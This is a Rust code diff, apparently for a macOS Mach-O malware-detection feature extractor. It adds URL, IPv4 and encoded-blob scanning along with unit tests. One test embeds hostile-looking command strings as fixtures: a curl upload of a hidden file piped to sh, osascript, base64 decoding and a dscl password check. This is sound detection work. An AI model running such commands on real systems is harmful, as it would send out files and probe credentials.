+    fv.count(F::StrUrlIp, url_ip);
+    fv.count(F::StrUrlNonstdPort, url_port);
     let mut per_feature: std::collections::BTreeMap<usize, u64> = std::collections::BTreeMap::new();
     for ((_, f), n) in STRING_PATTERNS.iter().zip(counts) {
         *per_feature.entry(*f as usize).or_default() += n;
@@ -1100,6 +1679,116 @@ fn string_features(fv: &mut Fv, data: &[u8], sections: &[SectionInfo<'_>]) {
             *slot = n.min(COUNT_CAP) as f32;
         }
     }
+}
+
+/// Max distinct URL hosts tracked.
+const MAX_URL_HOSTS: usize = 1000;
+/// Min length of a base64 / hex run counted as a blob.
+const MIN_BLOB: usize = 64;
+
+/// Host and optional port right after `scheme://` (lowercase not applied: hosts are compared bytewise).
+pub(crate) fn url_host(rest: &[u8]) -> (&[u8], Option<&[u8]>) {
+    let end = rest
+        .iter()
+        .take(260)
+        .position(|&b| !(b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_' | b':')))
+        .unwrap_or(rest.len().min(260));
+    let hostport = &rest[..end];
+    match hostport.iter().position(|&b| b == b':') {
+        Some(i) => {
+            let port = &hostport[i + 1..];
+            let digits = port.iter().take_while(|b| b.is_ascii_digit()).count();
+            (&hostport[..i], (digits > 0).then_some(&port[..digits]))
+        }
+        None => (hostport, None),
+    }
+}
+
+/// `a.b.c.d` with 1–3 digit parts, each <= 255.
+pub(crate) fn is_ipv4(s: &[u8]) -> bool {
+    let mut parts = 0;
+    for p in s.split(|&b| b == b'.') {
+        parts += 1;
+        if parts > 4 || p.is_empty() || p.len() > 3 || !p.iter().all(u8::is_ascii_digit) {
+            return false;
+        }
+        let v: u32 = p.iter().fold(0, |a, &d| a * 10 + u32::from(d - b'0'));
+        if v > 255 {
+            return false;
+        }
+    }
+    parts == 4
+}
+
+/// Single-pass structural string statistics (IPv4 literals, base64 / hex blobs, longest run).
+#[derive(Default)]
+pub(crate) struct StructStats {
+    pub max_run: usize,
+    pub ipv4: u64,
+    pub b64_blobs: u64,
+    pub b64_max: usize,
+    pub hex_blobs: u64,
+}
+
+fn is_b64(b: u8) -> bool {
+    b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_')
+}
+
+impl StructStats {
+    pub(crate) fn scan(&mut self, c: &[u8]) {
+        // base64 run state
+        let (mut b64, mut up, mut lo, mut dg) = (0usize, false, false, false);
+        let mut hex = 0usize;
+        let mut tok_start: Option<usize> = None;
+        for (i, &b) in c.iter().enumerate() {
+            if is_b64(b) {
+                b64 += 1;
+                up |= b.is_ascii_uppercase();
+                lo |= b.is_ascii_lowercase();
+                dg |= b.is_ascii_digit();
+            } else {
+                self.end_b64(b64, up && lo && dg);
+                (b64, up, lo, dg) = (0, false, false, false);
+            }
+            if b.is_ascii_hexdigit() {
+                hex += 1;
+            } else {
+                if hex >= MIN_BLOB {
+                    self.hex_blobs += 1;
+                }
+                hex = 0;
+            }
+            if b.is_ascii_digit() || b == b'.' {
+                tok_start.get_or_insert(i);
+            } else if let Some(t) = tok_start.take() {
+                if is_ipv4(trim_dots(&c[t..i])) {
+                    self.ipv4 += 1;
+                }
+            }
+        }
+        self.end_b64(b64, up && lo && dg);
+        if hex >= MIN_BLOB {
+            self.hex_blobs += 1;
+        }
+        if let Some(t) = tok_start {
+            if is_ipv4(trim_dots(&c[t..])) {
+                self.ipv4 += 1;
+            }
+        }
+    }
+
+    fn end_b64(&mut self, len: usize, mixed: bool) {
+        if len >= MIN_BLOB && mixed {
+            self.b64_blobs += 1;
+            self.b64_max = self.b64_max.max(len);
+        }
+    }
+}
+
+fn trim_dots(s: &[u8]) -> &[u8] {
+    let start = s.iter().position(|&b| b != b'.').unwrap_or(s.len());
+    let end = s.iter().rposition(|&b| b != b'.').map_or(start, |e| e + 1);
+    &s[start..end.max(start)]
 }
 
 #[cfg(test)]
@@ -1123,13 +1812,17 @@ mod tests {
     fn layout_is_consistent() {
         assert_eq!(FEATURE_NAMES.len(), FEATURE_DOCS.len());
         assert!(
-            (60..=150).contains(&FEATURE_NAMES.len()),
+            (60..=300).contains(&FEATURE_NAMES.len()),
             "{}",
             FEATURE_NAMES.len()
         );
         let set: BTreeSet<_> = FEATURE_NAMES.iter().collect();
         assert_eq!(set.len(), FEATURE_NAMES.len(), "duplicate feature names");
-        assert_eq!(F::StrLoginItems as usize, FEATURE_NAMES.len() - 1);
+        assert_eq!(F::FatNcmdsSpread as usize, FEATURE_NAMES.len() - 1);
+        // Every v2 pattern / family maps to a v2 feature declared after the v1 block.
+        assert!(STRING_PATTERNS
+            .iter()
+            .all(|(_, f)| (*f as usize) < FEATURE_NAMES.len()));
         assert!(FEATURE_NAMES.iter().all(|n| n
             .bytes()
             .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'_')));
@@ -1256,6 +1949,147 @@ mod tests {
                 assert!(v.iter().all(|x| x.is_finite()));
             }
         }
+    }
+
+    #[test]
+    fn v2_signature_and_entitlement_features() {
+        // Developer ID + runtime + timestamp + team: notarization-capable.
+        let mut cms = b"....Developer ID Application: Camille Martin (ABCDE12345)....".to_vec();
+        cms.extend_from_slice(&[
+            0x06, 0x0b, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x09, 0x10, 0x02, 0x0e,
+        ]);
+        let ents = "<plist><dict>\
+            <key>com.apple.security.cs.disable-library-validation</key><true/>\
+            <key>com.apple.security.automation.apple-events</key><true/>\
+            <key>com.apple.private.tcc.allow</key><array/>\
+            <key>com.apple.security.device.camera</key><true/>\
+            <key>com.apple.security.network.client</key><true/>\
+            </dict></plist>";
+        let bin = MachOBuilder::new_arm64_execute()
+            .code_signature(false, Some("ABCDE12345"), Some(ents))
+            .cms(&cms)
+            .cd_flags(0x1_0000 | 0x2000 | 0x200)
+            .identifier("com.example.camille.tool")
+            .build();
+        let v = extract_features(&bin).unwrap();
+        assert_eq!(get(&v, "cs_secure_timestamp"), 1.0);
+        assert_eq!(get(&v, "cs_developer_id"), 1.0);
+        assert_eq!(get(&v, "cs_notarization_capable"), 1.0);
+        assert_eq!(get(&v, "cs_hardening_flags"), 2.0);
+        assert_eq!(get(&v, "cs_n_code_directories"), 1.0);
+        assert_eq!(get(&v, "cs_ident_reverse_dns"), 1.0);
+        assert_eq!(get(&v, "cs_ident_hexish"), 0.0);
+        assert_eq!(get(&v, "cs_sha1_only"), 0.0);
+        assert_eq!(get(&v, "cs_not_at_linkedit_end"), 0.0);
+        // 3 (library validation) + 2 (apple-events) + 2 (private) + 1 (camera)
+        assert_eq!(get(&v, "ent_risk_score"), 8.0);
+        assert_eq!(get(&v, "ent_private_keys"), 1.0);
+        assert_eq!(get(&v, "ent_apple_events"), 1.0);
+        assert_eq!(get(&v, "ent_tcc_resources"), 1.0);
+        assert_eq!(get(&v, "ent_network"), 1.0);
+
+        // Ad-hoc, tool-generated identifier: not notarization-capable.
+        let adhoc = MachOBuilder::new_arm64_execute()
+            .code_signature(true, None, None)
+            .identifier("payload-55554944a1b2c3d4e5f60718")
+            .build();
+        let v = extract_features(&adhoc).unwrap();
+        assert_eq!(get(&v, "cs_notarization_capable"), 0.0);
+        assert_eq!(get(&v, "cs_ident_hexish"), 1.0);
+        assert_eq!(get(&v, "cs_ident_reverse_dns"), 0.0);
+        assert_eq!(get(&v, "ent_risk_score"), 0.0);
+    }
+
+    #[test]
+    fn v2_structural_strings() {
+        // Benign-but-suspicious-looking TEST strings (no real indicator, RFC 5737 addresses).
+        let blob =
+            "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk=";
+        let hexb = "0123456789abcdef".repeat(5);
+        let bin = MachOBuilder::new_arm64_execute()
+            .cstrings(&[
+                "http://192.0.2.10:8080/upload",
+                "https://example.org/a",
+                "https://example.org/b",
+                "connect to 198.51.100.7 now",
+                "version 1.2.3",
+                blob,
+                &hexb,
+                "osascript -e 'display dialog'",
+                "curl -F file=@/tmp/.x https://example.org | sh",
+                "echo test | base64 -d",
+                "dscl . -authonly camille",
+            ])
+            .build();
+        let v = extract_features(&bin).unwrap();
+        assert_eq!(get(&v, "str_url_hosts"), 2.0);
+        assert_eq!(get(&v, "str_url_ip"), 1.0);
+        assert_eq!(get(&v, "str_url_nonstd_port"), 1.0);
+        assert_eq!(get(&v, "str_ipv4"), 2.0); // 192.0.2.10 and 198.51.100.7, not 1.2.3
+        assert_eq!(get(&v, "str_b64_blobs"), 1.0);
+        assert!((get(&v, "str_b64_max_log2") - lg(blob.len() as u64)).abs() < 1e-6);
+        assert_eq!(get(&v, "str_hex_blobs"), 1.0);
+        assert_eq!(get(&v, "str_osascript_e"), 1.0);
+        assert_eq!(get(&v, "str_curl_upload"), 1.0);
+        assert_eq!(get(&v, "str_pipe_shell"), 1.0);
+        assert_eq!(get(&v, "str_decode_cmd"), 1.0);
+        assert_eq!(get(&v, "str_dscl_authonly"), 1.0);
+        assert_eq!(get(&v, "str_hidden_path"), 1.0);
+        assert!(get(&v, "str_max_run_log2") > 6.0);
+    }
+
+    #[test]
+    fn v2_load_commands_sections_and_fat() {
+        let bin = MachOBuilder::new_arm64_execute()
+            .dylib("/usr/lib/libSystem.B.dylib")
+            .weak_dylib("@rpath/libhijack.dylib")
+            .rpath("/Users/Shared/lib")
+            .extra_section("__DATA", "__shell", &[0xc0; 300], 0x8000_0400)
+            .build();
+        let v = extract_features(&bin).unwrap();
+        assert_eq!(get(&v, "lc_duplicate_dylibs"), 1.0);
+        assert_eq!(get(&v, "lc_weak_nonsystem_dylibs"), 1.0);
+        assert_eq!(get(&v, "lc_rpath_absolute_nonsystem"), 1.0);
+        assert_eq!(get(&v, "lc_no_uuid"), 1.0);
+        assert_eq!(get(&v, "lc_entry_outside_text"), 0.0);
+        assert_eq!(get(&v, "lc_misaligned_cmds"), 0.0);
+        assert_eq!(get(&v, "lc_sizeofcmds_mismatch"), 0.0);
+        assert_eq!(get(&v, "lc_segments_overlap"), 0.0);
+        assert_eq!(get(&v, "lc_sections_out_of_bounds"), 0.0);
+        assert_eq!(get(&v, "n_code_sections_outside_text"), 1.0);
+        assert!(get(&v, "entropy_mean_section") > 0.0);
+        assert_eq!(get(&v, "fat_n_parsed_slices"), 1.0);
+        assert_eq!(get(&v, "fat_size_ratio"), 1.0);
+
+        // Universal binary whose slices disagree (dylib vs executable, signed vs unsigned).
+        let x86 = MachOBuilder::new_arm64_execute()
+            .cputype(CPU_X86_64)
+            .code_signature(true, None, None)
+            .build();
+        let arm = MachOBuilder::new_arm64_execute().filetype(6).build();
+        let v = extract_features(&fat(&[(CPU_X86_64, x86), (CPU_ARM64, arm)])).unwrap();
+        assert_eq!(get(&v, "fat_n_parsed_slices"), 2.0);
+        assert_eq!(get(&v, "fat_filetype_mismatch"), 1.0);
+        assert_eq!(get(&v, "fat_signature_mismatch"), 1.0);
+        assert_eq!(get(&v, "fat_overlapping_slices"), 0.0);
+        assert_eq!(get(&v, "fat_unknown_cputype"), 0.0);
+        assert!(get(&v, "fat_size_ratio") > 0.0 && get(&v, "fat_size_ratio") < 1.0);
+    }
+
+    #[test]
+    fn url_and_ipv4_helpers() {
+        assert_eq!(url_host(b"example.org/x"), (&b"example.org"[..], None));
+        assert_eq!(
+            url_host(b"192.0.2.1:8443/a"),
+            (&b"192.0.2.1"[..], Some(&b"8443"[..]))
+        );
+        assert!(is_ipv4(b"10.0.0.255"));
+        assert!(!is_ipv4(b"10.0.0.256"));
+        assert!(!is_ipv4(b"1.2.3"));
+        assert!(!is_ipv4(b"1.2.3.4.5"));
+        let mut st = StructStats::default();
+        st.scan(b"..10.1.2.3.. and 4.5.6.7");
+        assert_eq!(st.ipv4, 2);
     }
 
     #[test]
